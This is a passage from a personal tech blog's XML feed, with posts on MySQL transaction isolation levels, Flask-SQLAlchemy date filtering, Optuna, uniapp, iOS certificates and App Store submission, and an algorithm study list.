</code></pre><h2 id="直接用set来改变mysql的自动提交模式"><a href="#直接用set来改变mysql的自动提交模式" class="headerlink" title="直接用set来改变mysql的自动提交模式"></a>直接用set来改变mysql的自动提交模式</h2><p>MYSQL默认是自动提交的，也就是你提交一个QUERY，它就直接执行！我们可以通过set autocommit=0 禁止自动提交set autocommit=1 开启自动提交来实现事务的处理。但注意当你用 set autocommit=0 的时候，你以后所有的SQL都将做为事务处理，直到你用commit确认rollback结束，并且只用于当前连接。</p>
<h1 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h1><p>※脏读：一个事务读取了另一个未提交的并行事务写的数据。</p>
<p>exp:<br>     小明的分数为89,事务A中把他的分数改为98,但事务A尚未提交。<br>     与此同时，<br>     事务B正在读取小明的分数，读取到小明的分数为98。<br>     随后，<br>     事务A发生异常，而回滚了事务。小明的分数又回滚为89。<br>     最后，<br>     事务B读取到的小明的分数为98的数据即为脏数据，事务B做了一次脏读。<br>     (大部分数据库缺省的事物隔离级别都不会出现这种状况)</p>
<p>※不可重复读：一个事务重新读取前面读取过的数据，发现该数据已经被另一个已提交的事务修改过。</p>
<p>在事务A中，读取到小明的分数为89，操作没有完成，事务还没提交。<br>     与此同时，<br>     事务B把小明的分数改为98，并提交了事务。<br>     随后，<br>     在事务A中，再次读取小明的分数，此时工资变为98。在一个事务中前后两次读取的结果并不致，导致了不可重复读。</p>
<p>※幻读：一个事务重新执行一个查询，返回一套符合查询条件的行，发现这些行因为其他最近提交的事务而发生了改变。</p>
<p>exp：<br>     目前分数为90分以上的的学生有15人，事务A读取所有分数为90分以上的的学生人数有15人。<br>     此时，事务B插入一条分数为99的学生记录。<br>     这是，事务A再次读取90分以上的的学生，记录为16人。此时产生了幻读。<br>     (大部分数据库缺省的事物隔离级别都会出现这种状况，此种事物隔离级别将带来表级锁)</p>
<p>READ UNCOMMITTED：幻读，不可重复读和脏读均允许；<br>     READ COMMITTED：允许幻读和不可重复读，但不允许脏读；<br>     REPEATABLE READ：允许幻读，但不允许不可重复读和脏读；<br>     SERIALIZABLE:幻读，不可重复读和脏读都不允许；<br>     ORACLE默认的是 READ COMMITTED。<br>     MYSQL默认的是 REPEATABLE READ。</p>
<pre><code>如果数据库的隔离级别为REAE_UNCOMMITTED， 则其他线程可以看到未提交的数据， 因此就出现脏读；
如果数据库隔离级别设为READ_COMMITTED，即没提交的数据别人是看不见的，就避免了脏读；但是，正在读取的数据只获得了读取锁，读完之后就解锁，不管当前事务有没有结束，这样就容许其他事务修改本事务正在读取的数据。导致不可重复读。
REPEATABLE READ因为对正在操作的数据加锁，并且只有等到事务结束才放开锁， 则可以避免不可重复读；
REPEATABLE READ只能保证正在被本事务操作的数据不被其他事务修改，却无法保证有其他事务提交新的数据。 则有可能线程1在操作表T1的时候（特别是统计性的事务），其他线程仍然可以提交新数据到表T1，这样会导致线程1两次统计的结果不一致，就像发生幻觉一样。
SERIALIZABLE因为获得范围锁，且事务是一个接着一个串行执行，则保证了不会发生幻读。
由此可见，隔离级别越高，受其他事物干扰越少，并发性能越差。
</code></pre><h1 id="修改事务的隔离级别："><a href="#修改事务的隔离级别：" class="headerlink" title="修改事务的隔离级别："></a>修改事务的隔离级别：</h1><pre><code>在MySQL中默认事务隔离级别是可重复读(Repeatable read).可通过SQL语句查询：
查看InnoDB系统级别的事务隔离级别：
mysql&gt; SELECT @@global.tx_isolation;

结果：
+-----------------------+
| @@global.tx_isolation |
+-----------------------+
| REPEATABLE-READ      |
+-----------------------+

查看InnoDB会话级别的事务隔离级别：
mysql&gt; SELECT @@tx_isolation;

结果：
+-----------------+
| @@tx_isolation  |
+-----------------+
| REPEATABLE-READ |
+-----------------+

修改事务隔离级别：
mysql&gt; set global transaction isolation level read committed;
mysql&gt; set session transaction isolation level read committed;
</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy2/">2020年最新flask-sqlalchemy用法总结(2)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
      <categories>
        <category>flask-sqlalchemy</category>
      </categories>
      <tags>
        <tag>flask-sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端开发到底有没有前途</title>
    <url>/2020/02/11/android-1/</url>
    <content><![CDATA[<p>该从事移动开发还是后端开发<br><a id="more"></a></p>
<h1 id="趋势"><a href="#趋势" class="headerlink" title="趋势"></a>趋势</h1><p>随着时代的发展，移动端取代pc端，成为了人们日常最常使用的互联网入口，现在移动端主要分为两大阵营，Android和ios，对应着Google和apple两大巨头，他们主导着移动端市场的发展方向。他们对于Android和Ios甚至开发了新的编程语言，比如kotlin和swift等等，他们都希望开发者可以更加依赖自己的平台，从而使用户更加依赖移动端。</p>
<p>但是你学习完这几种专门为移动端开发设计的语言之后，会发现除了大公司之外，小公司很少有移动端开发的需求，因为这会增加企业的开销。而响应式的网页就可以使移动用户可以愉快的使用了。Facebook和Google面对这种市场形式，为开发者设计了更好的移动端编程语言——react native和flutter，这两种语言可以一次编写可以同时应用于Android和ios两端，节省了很多时间对于开发者和企业来说。flutter甚至可以应用于H5和web端。</p>
<p>警惕！从上我们可以看出，移动端开发由巨头主宰者，这不符合开源的精神，尤其ios这样的开发平台，对于开发者来说简直是噩梦，所以你学原生的开发语言后，只能服务于大型的企业，很难转向其他的开发方向。而移动端的未来很难说，有可能这些原生的编程语言都将淘汰。</p>
<h1 id="从事后端开发"><a href="#从事后端开发" class="headerlink" title="从事后端开发"></a>从事后端开发</h1><p>每个企业都需要后端的开发人才，大量的业务需要后端的开发语言去处理，比如Java和python等等，所以就业的范围非常广阔</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-2/">Is there any future for mobile development?</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
      <categories>
        <category>移动开发</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Is there any future for mobile development?</title>
    <url>/2020/02/11/android-2/</url>
    <content><![CDATA[<p>Should I do mobile development or back-end development?<br>&lt;!-more-&gt;</p>
<h1 id="Trend"><a href="#Trend" class="headerlink" title="Trend"></a>Trend</h1><p>With the development of the times, the mobile terminal has replaced the PC terminal and has become the most commonly used Internet portal for daily use. Now the mobile terminal is mainly divided into two camps, Android and iOS, corresponding to Google and Apple. Market development direction. They even developed new programming languages ​​for Android and Ios, such as kotlin and swift, etc. They all hope that developers can rely more on their own platform, so that users can rely more on mobile.</p>
<p>But after you study these several languages ​​designed for mobile development, you will find that there is very little demand for mobile development in small companies, except for large companies, because it will increase the cost of the enterprise. And responsive web pages can make mobile users happy to use. Faced with this market form, Facebook and Google have designed better mobile programming languages ​​for developers—react native and flutter. These two languages ​​can be written at one time and can be applied to both Android and iOS, saving a lot of time For developers and businesses. flutter can even be applied to H5 and the web.</p>
<p>alert! From the above we can see that mobile terminal development is dominated by giants, which is not in line with the spirit of open source. In particular, development platforms such as iOS are a nightmare for developers, so after you learn the native development language, you can only serve For large enterprises, it is difficult to turn to other development directions. The future of mobile is hard to say, and it is possible that these native programming languages ​​will be eliminated.</p>
<h1 id="Engage-in-back-end-development"><a href="#Engage-in-back-end-development" class="headerlink" title="Engage in back-end development"></a>Engage in back-end development</h1><p>Every enterprise needs back-end development talents, and a large number of businesses need back-end development languages ​​to process, such as Java and Python, so the scope of employment is very broad</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-1/">移动端开发到底有没有前途</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
      <categories>
        <category>Mobile Development</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_learning 机器学习自动超参数优化软件框架——Optuna</title>
    <url>/2020/02/07/Machine-learning-1/</url>
    <content><![CDATA[<p>机器学习自动超参数优化软件框架——Optuna<br><a id="more"></a></p>
<p><img src="https://raw.githubusercontent.com/optuna/optuna/master/docs/image/optuna-logo.png" alt="Optuna"></p>
<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ...</span><br><span class="line"></span><br><span class="line"># Define an objective function to be minimized.</span><br><span class="line">def objective(trial):</span><br><span class="line"></span><br><span class="line">    # Invoke suggest methods of a Trial object to generate hyperparameters.</span><br><span class="line">    regressor_name = trial.suggest_categorical(&apos;classifier&apos;, [&apos;SVR&apos;, &apos;RandomForest&apos;])</span><br><span class="line">    if regressor_name == &apos;SVR&apos;:</span><br><span class="line">        svr_c = trial.suggest_loguniform(&apos;svr_c&apos;, 1e-10, 1e10)</span><br><span class="line">        regressor_obj = sklearn.svm.SVR(C=svr_c)</span><br><span class="line">    else:</span><br><span class="line">        rf_max_depth = trial.suggest_int(&apos;rf_max_depth&apos;, 2, 32)</span><br><span class="line">        regressor_obj = sklearn.ensemble.RandomForestRegressor(max_depth=rf_max_depth)</span><br><span class="line"></span><br><span class="line">    X, y = sklearn.datasets.load_boston(return_X_y=True)</span><br><span class="line">    X_train, X_val, y_train, y_val = sklearn.model_selection.train_test_split(X, y, random_state=0)</span><br><span class="line"></span><br><span class="line">    regressor_obj.fit(X_train, y_train)</span><br><span class="line">    y_pred = regressor_obj.predict(X_val)</span><br><span class="line"></span><br><span class="line">    error = sklearn.metrics.mean_squared_error(y_val, y_pred)</span><br><span class="line"></span><br><span class="line">    return error  # A objective value linked with the Trial object.</span><br><span class="line"></span><br><span class="line">study = optuna.create_study()  # Create a new study.</span><br><span class="line">study.optimize(objective, n_trials=100)  # Invoke optimization of the objective function.</span><br></pre></td></tr></table></figure>
<h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># PyPI</span><br><span class="line">$ pip install optuna</span><br><span class="line"></span><br><span class="line"># Anaconda Cloud</span><br><span class="line">$ conda install -c conda-forge optuna</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp框架GitHub演示地址</title>
    <url>/2020/02/07/uniapp-1/</url>
    <content><![CDATA[<p>uniapp的安卓、h5、ios和微信小程序等演示地址<br><a id="more"></a></p>
<p><img src="https://camo.githubusercontent.com/ae88ba2f70585b406bd6618dc9ac2dc9407372e3/68747470733a2f2f696d672d63646e2d71696e69752e64636c6f75642e6e65742e636e2f756e692d6170702d71722d616c6c2e6a7067" alt="uniapp"></p>
<h1 id="GitHub地址"><a href="#GitHub地址" class="headerlink" title="GitHub地址"></a>GitHub地址</h1><p><a href="https://github.com/dcloudio/hello-uniapp" target="_blank" rel="noopener">https://github.com/dcloudio/hello-uniapp</a></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/06/uniapp-3/">uniapp和HTML5+ app开启iOS13暗黑模式教程</a></li><li><a href="https://thelighter.github.io/2020/04/26/uniapp-2/">uniapp的uni.request使用方法</a></li></ul></div>]]></content>
      <categories>
        <category>uniapp</category>
      </categories>
      <tags>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在Flask_sqlalchemy中查询时间段或者时间点？</title>
    <url>/2020/02/07/flask-time/</url>
    <content><![CDATA[<p>Flask_sqlalchemy快速查找时间段和比较方法<br>如何限制每日签到次数？<br><a id="more"></a></p>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今天接到一个需要是通过时间限制签到次数，每日签到两次，这里需要flask-sqlalchemy模块fliter方法过滤时间范围。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fliter(db.cast(t.time, db.DATE) == datetime.date.today())</span><br></pre></td></tr></table></figure>
<ul>
<li>这里注意db.cast(t.time, db.DATE)的db.cast和db.DATE使用，将时间转换成日期</li>
<li>datetime.date.today() 只获取当前时间</li>
<li>这里获取的时间是 2020-02-07 这样格式的数据</li>
<li>需要解决，比对数据库中今天的数据的数量是否小于2次</li>
</ul>
<h1 id="延申"><a href="#延申" class="headerlink" title="延申"></a>延申</h1><p>查找时间段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter(User.birthday &lt; &apos;1996-01-01&apos;).\</span><br><span class="line">        filter(User.birthday &gt;= &apos;1990-01-01&apos;)</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from datetime import date </span><br><span class="line"></span><br><span class="line">start = date(year=2016,month=11,day=1) </span><br><span class="line">end = date(year=2016,month=11,day=30) </span><br><span class="line"></span><br><span class="line">posts = Post.query.filter(Post.post_time &lt;= end).filter(Post.post_time &gt;= start)</span><br></pre></td></tr></table></figure>
<p>python获取当前年月日</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import datetime</span><br><span class="line">datetime.datetime.now().year</span><br><span class="line">datetime.datetime.now().month</span><br><span class="line">datetime.datetime.now().day</span><br></pre></td></tr></table></figure>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy2/">2020年最新flask-sqlalchemy用法总结(2)</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask-sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>一键生成所有尺寸的应用图标和启动图</title>
    <url>/2020/02/04/apple-app-7/</url>
    <content><![CDATA[<p>支持所有设备——ios、Android、windows phone、web app和mac os的icon生成<br><a id="more"></a></p>
<p><img src="https://i.loli.net/2020/02/04/fWxnXqltPJY5meN.png" alt="一键生成所有尺寸icon"></p>
<p>网址：<a href="https://icon.wuruihong.com/" target="_blank" rel="noopener">图标工程</a></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/06/uniapp-4/">ios应用无法通过Application Loader上传到app store，报错ERROR ITMS-90596</a></li><li><a href="https://thelighter.github.io/2020/02/11/android-1/">移动端开发到底有没有前途</a></li><li><a href="https://thelighter.github.io/2020/02/11/android-2/">Is there any future for mobile development?</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-6/">iOS开发中Certificates、Identifiers和Profiles的定义</a></li></ul></div>]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS开发中Certificates、Identifiers和Profiles的定义</title>
    <url>/2020/02/04/apple-app-6/</url>
    <content><![CDATA[<p>ios开发中Certificates、Identifiers和Profiles到底有什么用<br><a id="more"></a></p>
<blockquote>
<p>这些文件必须在你注册了苹果开发者之后才可以申请 <a href="https://developer.apple.com/" target="_blank" rel="noopener">https://developer.apple.com/</a><br>注册苹果开发者每年100美金左右</p>
</blockquote>
<h1 id="Identifiers"><a href="#Identifiers" class="headerlink" title="Identifiers"></a>Identifiers</h1><p><img src="https://i.loli.net/2020/02/04/RbaU4A9FHuhBqYt.png" alt="Identifiers"></p>
<p>点击加号可以新建Identifiers文件</p>
<p><img src="https://i.loli.net/2020/02/04/Zcr9tMoinFU7GA3.png" alt="iOS Identifiers"></p>
<p>我们可以看到其中包含了很多ID<br>Identifiers分为六种，App IDs，Pass Type IDs,Website Push IDs,iCloud Containers,App Groups和Merchant IDs，App IDs用于标识一个或者一组App，App ID应该是和Xcode中的Bundle ID是一致的或者匹配的。<br>打包ipa包需要对应的APP IDs对应才能正常打包</p>
<h2 id="App-IDs主要有以下两种："><a href="#App-IDs主要有以下两种：" class="headerlink" title="App IDs主要有以下两种："></a>App IDs主要有以下两种：</h2><p>Explicit App ID：唯一的App ID，这种App ID用于唯一标识一个应用程序，例如com.cnblogs.xiaofeixiang，标识Bundle ID为com.cnblogs.xiaofeixiang的程序。<br>Wildcard App ID：通配符App ID，用于标识一组应用程序。例如<em>可以表示所有应用程序，而com.cnblogs.</em>可以表示以com.cnblogs开头的所有应用程序。</p>
<h1 id="Certificates"><a href="#Certificates" class="headerlink" title="Certificates"></a>Certificates</h1><p>证书也是通过点击加号来新建新的证书<br>其中包含以下内容</p>
<p><img src="https://i.loli.net/2020/02/04/AExhmR1JIeH4d6W.png" alt="ios Certificates "></p>
<p>和安卓的证书类似，但是apple ios的证书大致分为两种，一种是development证书用于安装测试版app在特定的设备上，另一种是distribution证书，用于在app商店发布正式版的应用。</p>
<p>对于不同平台又有不同的证书这里分为apple、ios和mac等。其中apple Development和apple distribution证书可以用于几乎所有的apple平台，比如 IOS、macOS、tvOS和watchOS等等。</p>
<h1 id="Profiles-配置文件"><a href="#Profiles-配置文件" class="headerlink" title="Profiles (配置文件)"></a>Profiles (配置文件)</h1><p>配置文件，分为两种，一种是Development，另外一种是Distribution</p>
<p><img src="https://i.loli.net/2020/02/04/vaVYO6INjFPgBkC.png" alt="Profiles (配置文件)"></p>
<p><strong>生成必须和对应的certificates和identifiers对应</strong></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/06/uniapp-4/">ios应用无法通过Application Loader上传到app store，报错ERROR ITMS-90596</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS APP提交审核，页面显示存在一个或多个错误的解决办法</title>
    <url>/2020/02/04/apple-app-5/</url>
    <content><![CDATA[<p>App 预览和截屏的处理办法</p>
<a id="more"></a>
<h1 id="苹果规定"><a href="#苹果规定" class="headerlink" title="苹果规定"></a>苹果规定</h1><p>App 预览和截屏 截屏必须为 JPG 或 PNG 格式，且必须采用 RGB 色彩空间。App 预览必须为 M4V、MP4 或 MOV 格式，且不能超过 500 MB。了解更多</p>
<p>这里明确规定了上传最多 3 个 App 预览和最多 10 张截屏拖到此处。<br>我们将针对在“媒体管理”中选择的所有 iPad 显示屏尺寸和本地化版本使用这些内容。</p>
<p><img src="https://i.loli.net/2020/02/04/rkmtMpgLqK76QFC.png" alt="App 预览和截屏的处理办法"></p>
<p>如何提交审核遇到以下错误<br><img src="https://i.loli.net/2020/02/04/CZHxIsEl5Wdrt9M.png" alt="575b24072e33f741541abc14673ff1b.png"></p>
<p>这里没有提示到底哪里出了问题，一般来说进行以下操作 点击上面的“在媒体管理中查看所有尺寸”<br>将没有打勾的并且你没有这个尺寸图片的都打勾</p>
<p><img src="https://i.loli.net/2020/02/04/ukfLyB8bcasO9No.png" alt="App 预览和截屏的处理办法"></p>
<h1 id="我经过以上处理，成功提交了审核"><a href="#我经过以上处理，成功提交了审核" class="headerlink" title="我经过以上处理，成功提交了审核"></a>我经过以上处理，成功提交了审核</h1><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/04/apple-app-3/">苹果app构建版本上传后没有显示如何解决</a></li><li><a href="https://thelighter.github.io/2020/02/03/apple-app-2/">苹果上架app——技术支持网页模板</a></li><li><a href="https://thelighter.github.io/2020/02/03/apple-app-1/">苹果上架app——隐私政策网页内容模板</a></li></ul></div>]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios上架</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS发布AppStore的详细流程</title>
    <url>/2020/02/04/apple-app-4/</url>
    <content><![CDATA[<a id="more"></a>
<p>主要内容：<br>1、创建唯一标示符App ID<br>2、申请发布证书<br>3、申请发布描述文件<br>4、iTunes Connect创建App并填写信息<br>5、选择证书编译打包<br>6、上传完成更新iTunes Connect信息，等待审核</p>
<p>1、创建唯一标示符App ID<br>2、申请发布证书<br>3、申请发布描述文件<br>4、iTunes Connect创建App并填写信息<br>打开 <a href="https://developer.apple.com" target="_blank" rel="noopener">https://developer.apple.com</a> 苹果的开发网站，选择Member Center，登录进去之后这次我们选择iTunes Connect选项，打开后如图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1362511-eab3da401288b6d9.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt></p>
<p>点击加号新建app</p>
<p>填写相关信息<br><img src="https://upload-images.jianshu.io/upload_images/1362511-80c77979fe026c32.png?imageMogr2/auto-orient/strip|imageView2/2/w/463/format/webp" alt></p>
<p>如果没问题会跳转到我们刚创建的App详情页面，需要我们填写更多的信息,下边看一下整个App详情页面,只需要选择APP的分类和子分类,如图:</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1362511-d61b17eac07fc652.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt></p>
<p>填写最上边的信息,需要填写App的定价信息,一般应用都是免费的,如图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1362511-dd1f66e0dd23043f.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt></p>
<p>需要设置App的价格等级，也就是我们App是免费还是收费的，如果收费的，收多少钱。</p>
<p>点击左侧添加一个新版本,如图:</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1362511-ec80e55a90650f36.png?imageMogr2/auto-orient/strip|imageView2/2/w/247/format/webp" alt></p>
<p>描述：关于App的文字描述<br>关键词：就是用于搜索我们app的关键字<br>技术支持网址：这个是必填项，需要写一个网址<br>隐私政策网址：非必填，到时候可以让公司提供</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1362511-266094446c3c8ceb.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt></p>
<p>下边填写我们的App综合信息：<br>App图标：这是应用程序的图标，1024*1024像素的png图片<br>版本：软件当前的版本号<br>类别：这款软件属于那种类型的软件，比如：新闻、音乐、教育等等<br>评级：软件评级有一个大的选项让你选择软件中包含的内容，苹果会根据你的选择确定你的软件属于哪个年龄段适应的。一会都选择17+比较保险<br>版权：版权信息一般把公司名字写上去<br>联系人详细信息：这个按提示把自己或者公司信息写上去就可以了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1362511-f4964b6347d7886c.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp" alt></p>
]]></content>
  </entry>
  <entry>
    <title>python-algorithmpython必会算法推荐</title>
    <url>/2020/02/04/python-algorithm/</url>
    <content><![CDATA[<p>pthon必会的算法推荐<br><a id="more"></a></p>
<h1 id="学习地址"><a href="#学习地址" class="headerlink" title="学习地址"></a>学习地址</h1><p><a href="https://github.com/nonstriater/Learn-Algorithms" target="_blank" rel="noopener">github地址</a></p>
<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><ul>
<li>链表</li>
<li>双向链表</li>
</ul>
<h3 id="哈希表-散列表-Hash-Table"><a href="#哈希表-散列表-Hash-Table" class="headerlink" title="哈希表/散列表 (Hash Table)"></a>哈希表/散列表 (Hash Table)</h3><ul>
<li>散列函数</li>
<li>碰撞解决</li>
</ul>
<h3 id="字符串算法"><a href="#字符串算法" class="headerlink" title="字符串算法"></a>字符串算法</h3><ul>
<li>排序</li>
<li>查找<ul>
<li>BF算法  </li>
<li>KMP算法  </li>
<li>BM算法  </li>
</ul>
</li>
<li>正则表达式</li>
<li>数据压缩</li>
</ul>
<h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><ul>
<li>二叉树    </li>
<li>二叉查找树   </li>
<li>伸展树(splay tree 分裂树)   </li>
<li>平衡二叉树AVL    </li>
<li>红黑树  </li>
<li>B树,B+,B*  </li>
<li>R树  </li>
<li>Trie树(前缀树)  </li>
<li>后缀树  </li>
<li>最优二叉树(赫夫曼树) </li>
<li>二叉堆 （大根堆，小根堆）   </li>
<li>二项树    </li>
<li>二项堆  </li>
<li>斐波那契堆(Fibonacci Heap)   </li>
</ul>
<h3 id="图的算法"><a href="#图的算法" class="headerlink" title="图的算法"></a>图的算法</h3><ul>
<li>图的存储结构和基本操作（建立，遍历，删除节点，添加节点）   </li>
<li>最小生成树  </li>
<li>拓扑排序  </li>
<li>关键路径  </li>
<li>最短路径: Floyd,Dijkstra,bellman-ford,spfa  </li>
</ul>
<h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><p><strong>交换排序算法</strong></p>
<ul>
<li>冒泡排序</li>
<li>插入排序    </li>
<li>选择排序    </li>
<li>希尔排序</li>
<li>快排   </li>
<li>归并排序  </li>
<li>堆排序</li>
</ul>
<p><strong>线性排序算法</strong></p>
<ul>
<li>桶排序 </li>
</ul>
<h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><ul>
<li>顺序表查找：顺序查找  </li>
<li>有序表查找：二分查找  </li>
<li>分块查找： 块内无序，块之间有序；可以先二分查找定位到块，然后再到<code>块</code>中顺序查找  </li>
<li>动态查找:  二叉排序树，AVL树，B- ，B+    （这里之所以叫 <code>动态查找表</code>，是因为表结构是查找的过程中动态生成的）</li>
<li>哈希表：  O(1)     </li>
</ul>
<h3 id="15个经典基础算法"><a href="#15个经典基础算法" class="headerlink" title="15个经典基础算法"></a>15个经典基础算法</h3><ul>
<li>Hash  </li>
<li>快速排序 </li>
<li>快递选择SELECT </li>
<li>BFS/DFS （广度/深度优先遍历）    </li>
<li>红黑树 （一种自平衡的<code>二叉查找树</code>）  </li>
<li>KMP    字符串匹配算法</li>
<li>DP (动态规划 dynamic programming)   </li>
<li>A*寻路算法： 求解最短路径 </li>
<li>Dijkstra：最短路径算法 （八卦下：Dijkstra是荷兰的计算机科学家,提出”信号量和PV原语“,”解决哲学家就餐问题”,”死锁“也是它提出来的） </li>
<li>遗传算法  </li>
<li>启发式搜索   </li>
<li>图像特征提取之SIFT算法  </li>
<li>傅立叶变换  </li>
<li>SPFA(shortest path faster algorithm)  单元最短路径算法  </li>
</ul>
<h2 id="海量数据处理"><a href="#海量数据处理" class="headerlink" title="海量数据处理"></a>海量数据处理</h2><ul>
<li>Hash映射/分而治之</li>
<li>Bitmap</li>
<li>Bloom filter(布隆过滤器)</li>
<li>Trie树</li>
<li>数据库索引</li>
<li>倒排索引(Inverted Index)</li>
<li>双层桶划分</li>
<li>外排序</li>
<li>simhash算法</li>
<li>分布处理之Mapreduce</li>
</ul>
<h2 id="算法设计思想"><a href="#算法设计思想" class="headerlink" title="算法设计思想"></a>算法设计思想</h2><ul>
<li>迭代法  </li>
<li>穷举搜索法  </li>
<li>递推法  </li>
<li>动态规划  </li>
<li>贪心算法  </li>
<li>回溯  </li>
<li>分治算法  </li>
</ul>
<h2 id="算法问题选编"><a href="#算法问题选编" class="headerlink" title="算法问题选编"></a>算法问题选编</h2><p>这是一个算法题目合集，题目是我从网络和书籍之中整理而来，部分题目已经做了思路整理。问题分类包括：</p>
<ul>
<li>字符串</li>
<li>堆和栈</li>
<li>链表</li>
<li>数值问题</li>
<li>数组和数列问题</li>
<li>矩阵问题</li>
<li>二叉树</li>
<li>图</li>
<li>海量数据处理</li>
<li>智力思维训练</li>
<li>系统设计</li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果app构建版本上传后没有显示如何解决</title>
    <url>/2020/02/04/apple-app-3/</url>
    <content><![CDATA[<p>苹果app构建版本上传后没有显示如何解决——Invalid App Store Icon<br><a id="more"></a></p>
<h1 id="构建版本上传后无法显示"><a href="#构建版本上传后无法显示" class="headerlink" title="构建版本上传后无法显示"></a>构建版本上传后无法显示</h1><p>只要上传成功之后，第一步就是查看你注册苹果开发者账号的邮箱，你会接收到一份错误提示邮件，告诉你——你的app应用哪里有问题，你就按照说明修改再上传就行。<br>有时没有收到邮件，说明正在构建版本中，可以在后台的活动中看到</p>
<p><img src="https://i.loli.net/2020/02/04/RtCL8Vm7KUwQ52v.png" alt="构建版本上传后无法显示"></p>
<h1 id="Invalid-App-Store-Icon问题和解决办法"><a href="#Invalid-App-Store-Icon问题和解决办法" class="headerlink" title="Invalid App Store Icon问题和解决办法"></a>Invalid App Store Icon问题和解决办法</h1><p>Dear Developer,</p>
<p>We identified one or more issues with a recent delivery for your app, “xxx” 1.1.0 (110). Please correct the following issues, then upload again.</p>
<p>ITMS-90717: Invalid App Store Icon - The App Store Icon in the asset catalog in ‘HBuilder.app’ can’t be transparent nor contain an alpha channel.</p>
<p>Best regards,</p>
<p>The App Store Team</p>
<p>上述问题是因为图标不合格的问题导致的，这里解决办法是不能上传透明和有aplha通道的图标。</p>
